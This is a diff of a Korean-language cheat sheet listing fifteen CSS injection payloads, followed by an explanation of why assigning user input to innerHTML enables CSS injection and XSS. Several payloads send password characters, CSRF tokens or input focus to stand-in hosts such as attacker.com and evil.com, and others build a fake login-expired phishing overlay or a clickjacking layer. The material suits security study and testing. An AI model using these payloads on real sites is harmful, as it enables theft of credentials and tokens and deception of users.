@@ -1,22 +1,22 @@
 # 🛠 CSS Injection Payload 예제
 
-| 번호         | 페이로드                                                                                                                                                      | 목적 / 설명                           | 사용 위치                 |
-| -- | --------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------- | --------------------- |
-| 1  | `<style>body { display: none; }</style>`                                                                                                                  | 전체 페이지 숨김 (DoS 유사 효과)             | `<style>` 태그 삽입 가능할 때 |
-| 2  | `</style><style>body{background:red}</style>`                                                                                                             | 기존 스타일 태그를 조기 종료하고 새 CSS 삽입       | HTML 콘텐츠 내            |
-| 3  | `<div style="color:red;background:url('https://attacker.com/log?a');">Test</div>`                                                                         | 외부 서버로 요청 유도 (정보 유출 가능)           | `style` 속성 내          |
-| 4  | `<style>input[type="password"][value^="a"] { background: url(https://attacker.com/a); }</style>`                                                          | 비밀번호 첫 글자 추측 (CSS + exfil)        | `<style>` 태그          |
-| 5  | `<style>input:focus { background-image: url('https://attacker.com/focus'); }</style>`                                                                     | 사용자가 입력 필드에 포커스할 때 외부 요청 발생       | `<style>` 태그          |
-| 6  | `<style>body::before { content: "로그인이 만료되었습니다"; position: fixed; top: 0; left: 0; background: white; width: 100%; height: 100%; z-index: 9999; }</style>` | 가짜 UI/피싱 창 삽입                     | `<style>` 태그          |
-| 7  | `<style>div::after { content: "🔥해킹됨"; color: red; }</style>`                                                                                             | 시각적 조작 (디버깅/장난/공포 유도)             | `<style>` 태그          |
-| 8  | `<div style="all:unset;position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;pointer-events:auto;"></div>`                                      | 클릭재킹 (투명 요소로 클릭 유도)               | `style` 속성            |
-| 9  | `<style>input[type="text"][value*="secret"] { background: url('https://evil.com/leak'); }</style>`                                                        | 입력값 내 특정 문자열 포함 여부 탐지             | `<style>` 태그          |
-| 10 | `<div style="width:1000px;height:1000px;background:url('javascript:alert(1)')">X</div>`                                                                   | 오래된 브라우저 대상 JS 트리거 시도 (실패 가능성 높음) | `style` 속성            |
-| 11 | `<style>@import url("https://attacker.com/evil.css");</style>`                                                                                            | 외부 악성 CSS 불러오기 (CSP 우회 시도)        | `<style>` 태그          |
-| 12 | `<style>form::before { content: url("https://attacker.com/img.png"); }</style>`                                                                           | 이미지 로딩 유도 (트래킹, 감지)               | `<style>` 태그          |
-| 13 | `<style>input[name='csrf'][value='token123'] { background: url('https://log.com/leak?token123'); }</style>`                                               | CSRF 토큰 추적 (간접적 정보 유출)            | `<style>` 태그          |
-| 14 | `<style>:root { --x: url("https://evil.com"); background: var(--x); }</style>`                                                                            | CSS 변수 활용한 우회 시도                  | `<style>` 태그          |
-| 15 | `<style>@keyframes leak { 0% { background: url('https://leak.com') } }</style>`                                                                           | 애니메이션 활용 외부 요청 유도                 | `<style>` 태그          |
+| 번호 | 페이로드                                                                                                                                                      | 목적 / 설명                          | 사용 위치                 |
+| -- | --------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------- | --------------------- |
+| 1  | `<style>body { display: none; }</style>`                                                                                                                  | 전체 페이지 숨김 (DoS 유사 효과)            | `<style>` 태그 삽입 가능할 때 |
+| 2  | `</style><style>body{background:red}</style>`                                                                                                             | 기존 `<style>` 태그 조기 종료 후 새 CSS 삽입 | HTML 콘텐츠 내            |
+| 3  | `<div style="color:red;background:url('https://attacker.com/log?a');">Test</div>`                                                                         | 외부 서버로 요청 유도 (정보 유출 가능)          | `style` 속성            |
+| 4  | `<style>input[type="password"][value^="a"] { background: url(https://attacker.com/a); }</style>`                                                          | 비밀번호 첫 글자 추측 (CSS + exfil)       | `<style>` 태그          |
+| 5  | `<style>input:focus { background-image: url('https://attacker.com/focus'); }</style>`                                                                     | 포커스 시 외부 요청 발생 (입력 감지)           | `<style>` 태그          |
+| 6  | `<style>body::before { content: "로그인이 만료되었습니다"; position: fixed; top: 0; left: 0; background: white; width: 100%; height: 100%; z-index: 9999; }</style>` | 가짜 UI/피싱 창 삽입                    | `<style>` 태그          |
+| 7  | `<style>div::after { content: "🔥해킹됨"; color: red; }</style>`                                                                                             | 시각적 조작 (공포, 장난)                  | `<style>` 태그          |
+| 8  | `<div style="all:unset;position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;pointer-events:auto;"></div>`                                      | 클릭재킹 (투명 클릭 유도)                  | `style` 속성            |
+| 9  | `<style>input[type="text"][value*="secret"] { background: url('https://evil.com/leak'); }</style>`                                                        | 특정 문자열 포함 여부 탐지                  | `<style>` 태그          |
+| 10 | `<div style="width:1000px;height:1000px;background:url('javascript:alert(1)')">X</div>`                                                                   | 구형 브라우저에서 JS 트리거 (현대 브라우저에선 실패)  | `style` 속성            |
+| 11 | `<style>@import url("https://attacker.com/evil.css");</style>`                                                                                            | 외부 악성 CSS 로딩 (CSP 우회 시도)         | `<style>` 태그          |
+| 12 | `<style>form::before { content: url("https://attacker.com/img.png"); }</style>`                                                                           | 이미지 로딩 유도 (트래킹 등)                | `<style>` 태그          |
+| 13 | `<style>input[name='csrf'][value='token123'] { background: url('https://log.com/leak?token123'); }</style>`                                               | CSRF 토큰 추적 (간접 유출)               | `<style>` 태그          |
+| 14 | `<style>:root { --x: url("https://evil.com"); background: var(--x); }</style>`                                                                            | CSS 변수 이용 우회 시도                  | `<style>` 태그          |
+| 15 | `<style>@keyframes leak { 0% { background: url('https://leak.com') } }</style>`                                                                           | 애니메이션 통한 외부 요청 유도                | `<style>` 태그          |
 
 ---
 
@@ -37,3 +37,47 @@
 | **입력값 추적용 스타일**     | `input[value^="a"]` 등 selector 조합으로 입력된 문자열 패턴을 추적하고 외부로 유출 시도                                     |
 | **브라우저 특이점 활용**     | 예전 IE는 `expression()`을 통해 JS 실행 가능 → 현대 브라우저는 대부분 차단                                               |
 | **DOM 기반 삽입 취약점**   | JavaScript로 `.innerHTML` 등에 삽입 시 CSS뿐 아니라 HTML 전체가 조작될 수 있어 위험                                     |
+
+---
+
+## ✅ 예시: `document.querySelector('article').innerHTML = content;` 
+
+### 🔍 역할
+
+```javascript
+document.querySelector('article').innerHTML = content;
+```
+
+* 이 코드는 HTML 문서 내의 `<article>` 요소를 찾고,
+* 해당 요소의 **내용(innerHTML)** 을 **자바스크립트 변수 `content`의 값으로 덮어씌움**.
+
+---
+
+### 🛑 보안상 위험 요소: XSS / CSS Injection 취약
+
+#### ⚠️ 만약 `content`에 사용자 입력이 포함된다면?
+
+```javascript
+let content = '<style>body { background: red; }</style>';
+```
+
+결과:
+
+```html
+<article>
+  <style>body { background: red; }</style>
+</article>
+```
+
+→ 스타일이 주입됨 (CSS Injection 성공)
+
+#### XSS도 가능:
+
+```javascript
+let content = '<img src=x onerror=alert(1)>';
+```
+
+→ JavaScript 실행됨 (XSS)
+
+
+
